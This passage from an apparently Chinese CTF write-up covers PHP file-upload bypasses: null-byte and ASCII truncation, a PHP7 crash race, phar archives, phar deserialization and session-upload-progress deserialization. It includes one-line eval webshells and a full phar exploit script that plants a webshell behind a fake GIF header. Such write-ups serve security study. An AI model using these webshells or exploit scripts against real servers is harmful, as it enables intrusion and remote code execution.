+<p>3.php7文件包含漏洞，PHP7中如果include(‘php://filter/string.strip_tags/resource=/etc/passwd’)，就会引起PHP程序直接崩溃，因而就不会进行到下面的unlink。然后就可以对上传的文件进行爆破。</p>
+<p>还有一种比较巧妙的是 post 的的 hehe 值为 vps 上的一个 php 脚本，这个脚本只需要 sleep 就行了。</p>
+<pre class="pure-highlightjs"><code class="">$_ = http://xx.xx.xx.xx/sleep.php</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/t4Cv0Li.png"></p>
+<p>这样就在 unlink 之前预留下了给我们爆破出原来上传的文件的时间</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/VbLLkk5.png"></p>
+<p> </p>
+<h2 name="h2-9" id="h2-9">截断绕过</h2>
+<h3 name="h3-10" id="h3-10">
+<a name="00%20%E6%88%AA%E6%96%AD"></a>00 截断</h3>
+<p>最常见的截断绕或要数 00 截断了，但是这种情况有很大的局限性，只有在 PHP 版本小于5.3.4 且 magic_quotes_gpc=Off时，否则 %00 这种空字符会被转义为</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/BN67ip9.png"></p>
+<ul>
+<li>不过在有的 ctf 题目中也经常会用到 00 截断这种技巧：<br>
+如 SUCTF 招新赛中的 Php is No.1，使用 %00 进行截断的话，就很容易跳过三个判断</li>
+</ul>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/DD0UZLR.png"></p>
+<p>同样这个比赛中的一道注入题 ClassicSqli，也用到 00 截断来达到注释语句的作用。</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/EBSe95R.png"></p>
+<p>关于截断的一些小总结，可以看笔者的<a href="http://note.youdao.com/noteshare?id=36658a534d9b3966bdef19cc3c5cb576&amp;sub=0AA98B1838C14D96B4CCEE3A6BB4C515">笔记</a>：</p>
+<h3 name="h3-11" id="h3-11">
+<a name="ascii%20%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%8C%85%E5%90%AB"></a>ascii 特殊字符包含</h3>
+<p>这里的例子是上海网安赛的 web4 ，参考了 sn00py 师傅的 wp</p>
+<p>这道题先是前台 sql 注入拿到 admin 的密码之后，登录后台会发现有上传点</p>
+<p>这里的上传有两个重要的参数，一个是文件目录（uploaddir），一个是文件名（filename）</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/uMnpMrW.png"></p>
+<p>上传之后会对 uploaddir 和 filename 直接进行拼接，然后直接加上 .txt 后缀。没办法从正面直接绕过，00 截断也是无效的，这里就尝试用 0x00~0xff 之内的 ascii 字符来截断。</p>
+<p>burp 中发送数据包到 intruder 模块，将范围控制在 0~255 之间</p>
+<p>用 intuder 模块的 payload 进行处理，先加上 % ，再进行 urldecode</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/45npDTg.png"></p>
+<p>在 0x02 时可以截断成功</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/dIAmsqW.png"></p>
+<p> </p>
+<h2 name="h2-12" id="h2-12">文件包含和文件上传的配合的情况</h2>
+<p>一般这类题目有共同的利用条件：</p>
+<p>利用条件：无法直接上传 shell，只能上传图片，存在文件包含</p>
+<h3 name="h3-13" id="h3-13">
+<a name="phar%20%E4%B8%A4%E7%A7%8D%E7%94%A8%E6%B3%95"></a>phar 两种用法</h3>
+<p>phar 是 php 中的一种归档压缩文件，类似 zip 。可以使用 phar:// 协议来访问压缩后的文件</p>
+<blockquote><p>PHP5.3之后支持了类似Java的jar包，名为phar。用来将多个PHP文件打包为一个文件。</p></blockquote>
+<p>后面的两种用法都用一个 SUCTF 招新赛的例子来说明：</p>
+<p>点开题目发现只有一个上传点，且只能上传 png、jpg、gif 文件，无法绕过后缀上传 shell</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/4H1OygT.png"></p>
+<h4 id="h4-u6B63u5E38u7528u6CD5">
+<a name="%E6%AD%A3%E5%B8%B8%E7%94%A8%E6%B3%95"></a>正常用法</h4>
+<p>第一种方法就是他的常规用法了，将 php 文件压缩成 zip 文件，zip 文件改后缀为 png 之后</p>
+<p>例如将下面的代码放在 1.php 中，压缩成 1.zip 并改名 1.png后上传</p>
+<pre class="pure-highlightjs"><code class="">&lt;?=eval($_POST['1']);?&gt;
+
+&lt;?php eval($_POST['1']);?&gt;
+
+&lt;script language='php'&gt;
+    eval($_POST['1']);
+&lt;/script&gt;</code></pre>
+<p>上传文件之后在右键 -&gt; 源代码中可以看到上传的地址，复制出来并用 phar:// 协议进行访问</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/dvPgaxc.png"></p>
+<pre>http://49.4.68.67:86/?act=get&amp;pic=phar:///var/www/html/sandbox/5eac5f7bd6358e10ff53dec9f3bb8690/4a47a0db6e60853dedfcfdf08a5ca249.png/1.php
+</pre>
+<p>在 f12 中可以看到很多符号都被过滤了，这里尝试了也没法直接绕过</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/MZqUd1q.png"></p>
+<p>后来发现 set-cookie 中给了提示：</p>
+<pre class="pure-highlightjs"><code class="">Set-Cookie: hint=cGxlYXNlIHJlYWQgcmVjZW50IHBhcGVycyBhYm91dCBwaGFy
+
+--&gt; please read recent papers about phar</code></pre>
+<p>于是这里想到了phar 的反序列化漏洞，貌似这个操作在 hitcon2017 的 Baby^H-master-php-2017 中就出现了，但是那个实在太难了…</p>
+<h4 id="h4-phar-">
+<a name="phar%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"></a>phar 反序列化漏洞</h4>
+<p>具体的原理这里也不说了，大概的用法可以看下面的这两篇文章：</p>
+<p><a href="https://blog.csdn.net/xiaorouji/article/details/83118619">https://blog.csdn.net/xiaorouji/article/details/83118619</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a></p>
+<p>直接放官方的 exp 吧：</p>
+<pre class="pure-highlightjs"><code class="">&lt;?php
+
+ class PicManager{
+     private $current_dir;
+     private $whitelist=['jpg','png','gif'];
+     private $logfile='request.log';
+     private $actions=[];
+
+     public function __construct($dir){
+         $this-&gt;current_dir=$dir;
+         if(!is_dir($dir))@mkdir($dir);
+     }
+
+     private function _log($message){
+         array_push($this-&gt;actions,'['.date('y-m-d h:i:s',time()).']'.$message);
+     }
+
+     public function pics(){
+         log('list pics');
+         $pics=[];
+         foreach(scandir($dir) as $item){
+             if(in_array(substr($item,-4),$whitelist))
+                 array_push($pics,$current_dir."/".$item);
+         }
+         return $pics;
+     }
+     public function upload_pic(){
+         _log('upload pic');
+         $file=$_FILES['file']['name'];
+         if(!in_array(substr($file,-4),$this-&gt;whitelist)){
+             _log('unsafe deal:upload filename '.$file);
+             return;
+         }
+         $newname=md5($file).substr($file,-4);
+         move_uploaded_file($_FILES['file']['tmp_name'],$current_dir.'/'.$newname);
+     }
+     public function get_pic($picname){
+         _log('get pic'.$picname);
+         if(!file_exists($picname))
+             return '';
+         else return file_get_contents($picname);
+     }
+     public function __destruct(){
+         $fp=fopen($this-&gt;current_dir.'/'.$this-&gt;logfile,"a+");
+         foreach($this-&gt;actions as $act){
+             fwrite($fp,$act."n");
+         }
+         fclose($fp);
+     }
+
+     public function gen(){
+         @rmdir($this-&gt;current_dir);
+         $this-&gt;current_dir="/var/www/html/sandbox/a6bfb20ba19df73fcceb438f5f75948f/"; //md5($_SERVER['REMOTE_ADDR'])
+         $this-&gt;logfile='H4lo.php';
+         $this-&gt;actions=['&lt;?php eval($_REQUEST[p]);'];
+         @unlink('phar.phar');
+
+
+         $phar = new Phar("phar.phar");
+         $phar-&gt;startBuffering();
+         $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub，增加gif文件头用以欺骗检测
+         $phar-&gt;setMetadata($this); //将自定义meta-data存入manifest
+         $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件
+                 //签名自动计算
+         $phar-&gt;stopBuffering();
+
+     }
+ }
+
+$pic=new PicManager('/var/www/html/sandbox');
+$pic-&gt;gen();</code></pre>
+<p>运行 php 脚本会在当前目录下生成 phar.phar 文件（需要在 php.ini 中将 phar.readonly 设置为 Off）</p>
+<p>接着将 phar.phar 重命名为 phar.gif ，上传之后同样复制出地址，利用 phar 协议包含文件以后，就会触发反序列化漏洞，将我们前面 exp 中的代码执行（生成 H4lo.php）。</p>
+<pre class="pure-highlightjs"><code class="">http://49.4.68.67:86/?act=get&amp;pic=phar:///var/www/html/sandbox/a6bfb20ba19df73fcceb438f5f75948f/1b33718042e7dfe8fac079be96ebc4d9.gif</code></pre>
+<ul>
+<li>这里只需要 phar://xxx.gif 的形式就好了，因为这是一个 phar 对象文件，不是一个压缩包</li>
+</ul>
+<p>访问一下，这样就得到 flag 了：</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/t1ypJew.png"></p>
+<h3 name="h3-14" id="h3-14">
+<a name="PHP%20%E8%87%AA%E5%8C%85%E5%90%AB%E7%89%B9%E6%80%A7"></a>PHP 自包含特性</h3>
+<p>这个技巧可以看我之前的写过的<a href="https://www.anquanke.com/post/id/153376">一篇文章</a>，也是来源于一道 ctf （百度杯 nlog 进阶版）</p>
+<p>这个自包含和下面的反序列化上传的姿势，都是需要自己构造文件上传页面，感觉脑洞还是挺大了，稍微了解一下就好了</p>
+<h3 name="h3-15" id="h3-15">
+<a name="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8A%E4%BC%A0"></a>反序列化上传</h3>
+<p>这个也是来源于一道 ctf（jarvisoj phpinfo），题目地址</p>
+<p><a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a></p>
+<p>附上详细的解答：</p>
+<p><a href="https://blog.csdn.net/wy_97/article/details/78430690">https://blog.csdn.net/wy_97/article/details/78430690</a></p>
+<p>简而言之，就是自己构造一个上传界面，将 file 字段的 filename 定义为反序列化的字符串，服务器处理的时候就会触发这个漏洞。</p>
+<pre class="pure-highlightjs"><code class="">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;test XXE&lt;/title&gt;
+    &lt;meta charset="utf-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt;&lt;!--     
+不对字符编码--&gt;
+        &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt;
+        &lt;input type="file" name="file" /&gt;
+        &lt;input type="submit" value="go" /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img alt="" data-original="https://i.imgur.com/aWTGOOG.png"></p>
+<p> </p>
+<h2 name="h2-16" id="h2-16">总结</h2>
+<p>在近些比赛中将文件上传和文件包含结合起来，作为考点进行考察的题目还是蛮多的。在比赛中多总结一下姿势还是挺有帮助的，无论是在今后的 ctf 比赛中还是实战的漏洞挖掘。</p>
+</body>
+</html>
+                    </div>
+                    <section class="article-footer-label">
+                        <div>
+                                                         <div>
+                                本文由安全客原创发布
+                                <br>转载，请参考<a href="/note/repost" target="_blank">转载声明</a>，注明出处：
+                                <a href="/post/id/164561"
+                                   target="_blank">https://www.anquanke.com/post/id/164561</a>
+                                <br>安全客 - 有思想的安全新媒体
+                            </div>
+                                                     </div>
+                    </section>
+                    <section style="margin-top:18px;">
+                                                    <a class="article-tag-primary" href="/tag/CTF" target="_blank">CTF</a>                             <a class="article-tag-primary" href="/tag/Web安全" target="_blank">Web安全</a>                             <a class="article-tag-primary" href="/tag/文件上传" target="_blank">文件上传</a>                     </section>
+                    <section style="text-align:center;margin-top:40px;" class="hide-in-mobile-device">
+                        <button onclick="likePost()" class="btn btn-primary btn-lg btn-like"
+                                 style="min-width:100px;">
+                            <i class="fa fa-thumbs-o-up" aria-hidden="true" style="margin-right:10px;"></i>
+                                                            <span id="like_status">赞</span> <span id="like_count_area"> (
+                                    <span
+                                            id="like_count">19</span>)</span>
+                                                    </button>
+                        <button class="btn btn-danger btn-lg btn-favorite" style="min-width:100px;"
+                                onclick="favorite();">
+                            <i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏
+                        </button>
+                    </section>
+                    <section class="hide-in-mobile-device"
+                             style="text-align:center;margin-top:40px;border-top:1px #f7f7f7 solid;position:relative;line-height:40px;">
+                        <div style="float:left;height:80px;line-height:80px;">
+                            <a rel="noopener noreferrer" target="_blank" href="/member/131779"
+                               style="color:#333333">
+                                <div>
+                                    <div class="avatar"
+                                         style="background-image: url(https://p2.ssl.qhimg.com/sdm/40_40_100/t0129eee7c67478558f.jpg);height:28px;width:28px;margin-top:28px;float:left;"></div>
+                                    <div style="float:left;margin-left:5px;">
+                                        <nobr>
+                                                <span class="">H4lo</span>                                             <span class="user_label verify_label">认证</span>                                         </nobr>
+                                    </div>
+                                </div>
+                            </a>
+                        </div>
+                        <div class="bdsharebuttonbox" data-tag="share_1"
+                             style="display:table-cell;vertical-align:midlle;float:right;margin-top:20px;">
+                            <span style="font-weight: 800;color: #999999;">分享到：</span>
+                            <img data-cmd="qzone" alt="QQ空间"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png"/>
+                            <img data-cmd="tsina" alt="新浪微博"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png"/>
+                            <img data-cmd="weixin" alt="微信"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"/>
+                            <img data-cmd="sqq" alt="QQ"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png"/>
+                            <img data-cmd="fbook" alt="facebook"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png"/>
+                            <img data-cmd="twi" alt="twitter"
+                                 src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png"/>
+                        </div>
+                    </section>
+                    <div>
+                    </div>
+                </div>
+                <section style="margin-top:20px;" class="hide-in-mobile-device">
+                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>推荐阅读
+                        <div style="position:absolute;right:18px;top:14px;font-size:14px;">
+                        </div>
+                    </div>
+                    <div class="row">
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/206457">
+                                    <img src="https://p1.ssl.qhimg.com/sdm/229_160_100/t01caf8897cd32b303a.jpg"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">Safe-Linking——针对 malloc 安全防护机制</h6>
+                                    <time style="color:#999999">2020-05-25 15:30:17</time>
+                                </a>
+                            </div>
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/206483">
+                                    <img src="https://p3.ssl.qhimg.com/sdm/229_160_100/t01003deb0485f2a582.jpg"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">RATicate攻击活动分析</h6>
+                                    <time style="color:#999999">2020-05-25 11:00:35</time>
+                                </a>
+                            </div>
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/206442">
+                                    <img src="https://p0.ssl.qhimg.com/sdm/229_160_100/t015d837e26ec1f2d03.jpg"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">CVE-2020-3153：Cisco AnyConnect Installer本地提权漏洞分析及利用</h6>
+                                    <time style="color:#999999">2020-05-25 10:00:35</time>
+                                </a>
+                            </div>
+                                                    <div class="col col-6" style="padding:6px;">
+                                <a href="/post/id/205987">
+                                    <img src="https://p2.ssl.qhimg.com/sdm/229_160_100/t01fe3fe05fbd1969a9.jpg"
+                                         class="rounded" style="width:100%;">
+                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">一起来学PHP代码审计（一）入门</h6>
+                                    <time style="color:#999999">2020-05-22 16:00:07</time>
+                                </a>
+                            </div>
+                                            </div>
+                </section>
+                <div style="width:100%;" class="comment-area" id="comment">
+                    <section style="margin-top:20px;">
+                        <div style="font-weight:bolder;position:relative;font-size:18px;">
+                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>发表评论
+                        </div>
+                        <div class="comment-box">
+                            <textarea id="comment-content" placeholder="发表你的评论吧"></textarea>
+                            <div class="bottom-area">
+                                <div style="float:left;" class="comment-login hide-in-mobile-device">
+                                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
+                                        <a rel="noopener noreferrer" target="_blank"
+                                           href="/member/131779"
+                                           style="color:#333333">
+                                            <div>
+                                                <div class="avatar"
+                                                     style="height:28px;width:28px;float:left;"></div>
+                                                <div style="float:left;margin-left:5px;">
+                                                    <nobr>
+                                                        <span class="nickname">
+                                                        </span>
+                                                    </nobr>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </div>
+                                </div>
+                                <div style="float:left;" class="comment-not-login hide-in-mobile-device">
+                                    <span class="hide-in-mobile-device"
+                                          style="color:#666666;margin-right:4px;font-size:12px;">昵称</span>
+                                    <input class="hide-in-mobile-device" type="text"
+                                           style="border:none;height:30px;background-color:#e9e9e9;font-size:12px;padding-left:8px;color:#666666"
+                                           id="comment-nickname" style="" value="教主"></input>
+                                    <span class="hide-in-mobile-device"
+                                          style="margin-left:12px;color:#999999;font-size:12px;cursor:pointer"
+                                          onclick="getRandomNickname(false);">
+                                        <i class="fa fa-refresh" aria-hidden="true"
+                                           style="margin-right:4px;"></i> 换一个</span>
+                                </div>
+                                <div style="float:right;">
+                                    <button class="btn btn-primary btn-sm" onclick="comment(false);">发表评论</button>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section style="margin-top:40px;">
+                        <div style="font-weight:bolder;position:relative;font-size:18px;">
+                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>评论列表
+                        </div>
+                        <div style="width:100%;line-height:180px;text-align:center;color:#999999;font-size:15px;display:none;"
+                             id="comment-empty">
+                            还没有评论呢，快去抢个沙发吧~
+                        </div>
+                        <ul style="padding:0px ;margin-top:20px;" id="comment-list">
+                        </ul>
+                        <div id="loadButton"
+                             style="width:100%;background-color:#e2e2e2;border-radius:4px;text-align:center;padding:7px;margin-top:20px;color:#666666;cursor:pointer;"
+                             onclick="loadComment(false);">加载更多
+                        </div>
+                    </section>
+                </div>
+            </div>
+            <!-- 侧边栏 -->
+            <div class="col col-xs-0 col-sm-0 col-md-0 col-lg-6 hide-in-mobile-device">
+                <div class="sidebar">
+                    <div class="article-detail-user-box box-shadow" style="background-color: white">
+                        <div>
+                            <div class="row">
+                                <div class="col col-24">
+                                    <div style="background-image:url('https://p4.ssl.qhimg.com/sdm/290_80_100/t0192902920625c7db6.png');margin-top:-12px;height: 80px;margin-left:-12px;margin-right:-12px;background-position: center;background-size: cover;"></div>
+                                    <a rel="noopener noreferrer" target="_blank" href="/member/131779">
+                                        <div class="avatar"
+                                             style="box-shadow:2px 5px 17px #eee;background-color:white;background-image: url(https://p2.ssl.qhimg.com/sdm/200_200_100/t0129eee7c67478558f.jpg);z-index: 4;margin-top: -40px;"></div>
+                                    </a>
+                                </div>
+                                <div class="col col-24">
+                                    <div class="user-info" style="text-align: center;margin-left: 0;">
+                                        <a rel="noopener noreferrer" target="_blank"
+                                           href="/member/131779">
+                                            <div class="name" style="display:table-cell;vertical-align:middle;">
+                                                <span style="display:table-cell;vertical-align:middle;"><span
+                                                            style="vertical-align:middle;">H4lo</span>
+<img class="user-label user-label-verify"/>
+                                                        </span>
+                                            </div>
+                                        </a>
+                                        <div class="slogan">深沉而浓烈</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="bottom-info">
+                                <div class="bottom-info-left">
+                                    <div class="info-block">
+                                        <div class="key">文章</div>
+                                        <div class="value">19</div>
+                                    </div>
+                                    <div class="info-block">
+                                        <div class="key">粉丝</div>
+                                        <div class="value">66</div>
+                                    </div>
+                                </div>
+                                <div class="bottom-info-right">
+                                    <div class="info-block" style="width: auto; padding: 10px;">
+                                        <div>
+                                            <button type="button" style="display: none;"
+                                                    class="btn btn-outline-primary btn-sm follow-button">
+                                                <i class="fa fa-plus" style="margin-right:3px;"></i>
+                                                <span>关注</span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <h2>TA的文章</h2>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/186447">一道 CTF 题目学习 prctl 函数的沙箱过滤规则</a>
+                                    </div>
+                                    <div class="date">2019-09-20 15:30:05</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/183871">路由器漏洞挖掘之 TEW_645TR_1.12 sql 注入分析</a>
+                                    </div>
+                                    <div class="date">2019-08-13 15:45:35</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/183202">由一道工控路由器固件逆向题目看命令执行漏洞</a>
+                                    </div>
+                                    <div class="date">2019-08-01 16:30:06</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/180009">格式化字符串任意地址写操作学习小计</a>
+                                    </div>
+                                    <div class="date">2019-06-11 11:30:38</div>
+                                </div>
+                                                            <div class="post-item">
+                                    <div class="title">
+                                        <a href="/post/id/179510">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a>
+                                    </div>
+                                    <div class="date">2019-05-30 14:30:27</div>
+                                </div>
+                                                    </div>
+                    </div>
+                    <div class="input-group mb-3" style="margin-top:14px;">
+                        <div class="input-group-prepend">
+                                <span class="input-group-text" style="background-color:white;color:#1dada7"
+                                      id="basic-addon1">
+                                    <i class="fa fa-search" aria-hidden="true"></i>
+                                </span>
+                        </div>
+                        <input type="text" class="form-control search-input" placeholder="输入关键字搜索内容" aria-label="search"
+                               aria-describedby="basic-addon1">
+                    </div>
+                    <div class="meta-box">
+                        <h3 class="meta-box-title">相关文章</h3>
+                        <div style="padding:8px;">
+                            <ul class="similar—article-list">
+                                                                    <li>
+                                        <a href="/post/id/205987" target="_blank" rel="noopener noreferrer">
+                                            一起来学PHP代码审计（一）入门</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/205679" target="_blank" rel="noopener noreferrer">
+                                            2020网鼎杯朱雀组部分Web题wp</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/205376" target="_blank" rel="noopener noreferrer">
+                                            SQL注入基础整理及Tricks总结</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/205721" target="_blank" rel="noopener noreferrer">
+                                            firefox pwn 入门 - 33c3 feuerfuchs 复现</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/205572" target="_blank" rel="noopener noreferrer">
+                                            Browser Pwn XNUCA2019-JIT 分析与利用</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/205578" target="_blank" rel="noopener noreferrer">
+                                            2020网鼎杯-朱雀组-部分wp</a>
+                                    </li>
+                                                                    <li>
+                                        <a href="/post/id/205215" target="_blank" rel="noopener noreferrer">
+                                            通过两道题浅看java安全</a>
+                                    </li>
+                                                            </ul>
+                        </div>
+                    </div>
+                    <div class="card hot-recommand">
+                        <div class="card-header">
+                            热门推荐
+                        </div>
+                        <div class="card-body">
+                            <div class="home-block-info">
+                                <a rel="noopener noreferrer" href="/post/id/162175" target="_blank">
+                                    <div class="block-info-item"
+                                         style="margin-left: 0px; height: 195px; margin-top: 0px; background:url(https://p4.ssl.qhimg.com/t0103c09221eaa4f35b.png) repeat scroll center center / cover; overflow: hidden; width: 100%;">
+                                        <div class="block-info-item-bg"
+                                             style="width: 100%;background-color:transparent;">
+                                                                                    </div>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                                            <div class="article-index">
+                            <h5>文章目录</h5>
+                            <nav id="article-index" class="navbar navbar-light">
+                                <nav class="nav nav-pills ">
+                                                                            <a class="nav-link" href="#h2-0">前言</a>                                          <a class="nav-link" href="#h2-1">文件上传的本质</a>                                          <a class="nav-link" href="#h2-2">基本上传思路的回顾</a>                                             <nav class="nav nav-pills sub-index">
+                                                                                                    <a class="nav-link"
+                                                       href="#h3-3">前端绕过</a>                                                     <a class="nav-link"
+                                                       href="#h3-4">MIME</a>                                                     <a class="nav-link"
+                                                       href="#h3-5">大写 Multipart</a>                                             </nav>
+                                                                                 <a class="nav-link" href="#h2-6">后缀名构造</a>                                             <nav class="nav nav-pills sub-index">
+                                                                                                    <a class="nav-link"
+                                                       href="#h3-7">构造数组绕过</a>                                                     <a class="nav-link"
+                                                       href="#h3-8">上海网安赛 web3</a>                                             </nav>
+                                                                                 <a class="nav-link" href="#h2-9">截断绕过</a>                                             <nav class="nav nav-pills sub-index">
+                                                                                                    <a class="nav-link"
+                                                       href="#h3-10">00 截断</a>                                                     <a class="nav-link"
+                                                       href="#h3-11">ascii 特殊字符包含</a>                                             </nav>
+                                                                                 <a class="nav-link" href="#h2-12">文件包含和文件上传的配合的情况</a>                                             <nav class="nav nav-pills sub-index">
+                                                                                                    <a class="nav-link"
+                                                       href="#h3-13">phar 两种用法</a>                                                     <a class="nav-link"
+                                                       href="#h3-14">PHP 自包含特性</a>                                                     <a class="nav-link"
+                                                       href="#h3-15">反序列化上传</a>                                             </nav>
+                                                                                 <a class="nav-link" href="#h2-16">总结</a>                                  </nav>
+                            </nav>
+                        </div>
+                                    </div>
+            </div>
+        </div>
+    </div>
+    <link href="https://lib.baomitu.com/highlight.js/9.12.0/styles/github.min.css" rel="stylesheet">
+<script src="https://lib.baomitu.com/highlight.js/9.12.0/highlight.min.js"></script>    <script>
+        $(function () {
+            $("img").lazyload({
+                effect: "fadeIn"
+            });
+            $(".lazy").lazyload({
+                effect: "fadeIn"
+            });
+        });
+        $(".article-index").sticky({
+            topSpacing: 60
+        });
+        hljs.initHighlighting();
+    </script>
+</main>
+<script>
+    $(document).ready(function () {
+        $(".article-index").mCustomScrollbar({
+            theme: "minimal-dark"
+        });
+        loadComment(true);
+        getRandomNickname(false);
+        var desc = "https://p4.ssl.qhimg.com/t01117e245609d26661.png";
+        window._bd_share_config = {
+            share: [{
+                bdText: "对文件上传的一些思考和总结",
+                bdDesc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
+                bdUrl: window.location.href,
+                bdPic: "https://p4.ssl.qhimg.com/t01117e245609d26661.png",
+                tag: "share_1"
+            }]
+        };
+        with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement(
+            'script')).src =
+            'https://static.anquanke.com/bdshare/static/api/js/share.js?cdnversion=' + ~(-new Date() /
+            36e5)];
+    });
+    $(window).scroll(function () {
+        var top1 = $('#comment-list').offset().top;
+        var gun = $(document).scrollTop();
+        var top = top1 - gun;
+        if (top <= 700) {
+            $('.article-index').fadeOut();
+        } else {
+            $('.article-index').fadeIn();
+        }
+    });
+    var post_id = "164561"; //文章id
+    var user_id = "131779"; //作者用户id
+
+    var post_favorite = false;
+    var next = "";
+    var comments = [];
+    axios.get(api("user/favorite?target_post_id=" + post_id)).then(function (res) {
+        if (res.data.success) {
+            swtichFavorite(res.data.data.favorite);
+            post_favorite = res.data.data.favorite;
+        }
+    });
+
+    function swtichFavorite(favorite) {
+        if (favorite) {
+            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>已收藏');
+        }
+        else {
+            $(".btn-favorite").html('<i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏');
+        }
+    }
+
+    function favorite() {
+        if (getLocalUserInfo().isLogin) {
+            post_favorite = !post_favorite;
+            swtichFavorite(post_favorite);
+            axios.post(api("user/favorite"), {"id": post_id}).then(function (res) {
+            });
+        }
+        else {
+            window.location.href = "/login";
+        }
+    }
+    function removeSpecialChar(s) {
+        if(!s)s="";
+        return s.replace("'","").replace("<","").replace(">","").replace("(","").replace(")","").replace("&","").replace(":","").replace("\'","").replace("\"","").replace("=","").replace(".","").replace(";","");
+    }
+
+    function loadComment(refresh) {
+        var request_url = "";
+        if (refresh) {
+            $("#comment-list").empty();
+        }
+        if (next) request_url = next;
+        else request_url = api("comment?top=true&size=30&page=1&post_id=" + post_id);
+        axios.get(request_url).then(function (res) {
+            var normal_comment_template_source = $("#normal-comment").html();
+            var normal_comment_template = Handlebars.compile(normal_comment_template_source);
+            if (res.data.data && res.data.data.length > 0) {
+                res.data.data.forEach(function (e) {
+                    var html = "";
+                    if(e.user)
+                    {
+                        e.user.nickname=removeSpecialChar(e.user.nickname);
+                    }
+
+                    if(e.nickname)
+                    {
+                        e.nickname=removeSpecialChar(e.nickname);
+                    }
+
+                    html = normal_comment_template(e);
+                    $("#comment-list").append(html);
+                });
+                next = res.data.next;
+                $("#comment-empty").hide();
+            }
+            else {
+                $("#comment-empty").show();
+                $("#loadButton").hide();
+            }
+
+            if ((!res.data.data) || res.data.data.length < 30) $("#loadButton").hide();
+            else $("#loadButton").show();
+        });
+    }
+
+    Handlebars.registerHelper('subcomments', function (value) {
+        var html = "";
+        $.each(value, function (i, item) {
+            var sub_comment_template_source = $("#normal-comment").html();
+            var sub_comment_template = Handlebars.compile(sub_comment_template_source);
+            html += sub_comment_template(item);
+        });
+        return new Handlebars.SafeString(html);
+    });
+    Handlebars.registerHelper('if_author', function (value, opts) {
+        if (value == user_id)
+            return opts.fn(this);
+        else
+            return opts.inverse(this);
+    });
+
+    function replyBox(comment_id, nickname) {
+        var reply_box_template_source = $("#reply-box").html();
+        var reply_box_template = Handlebars.compile(reply_box_template_source);
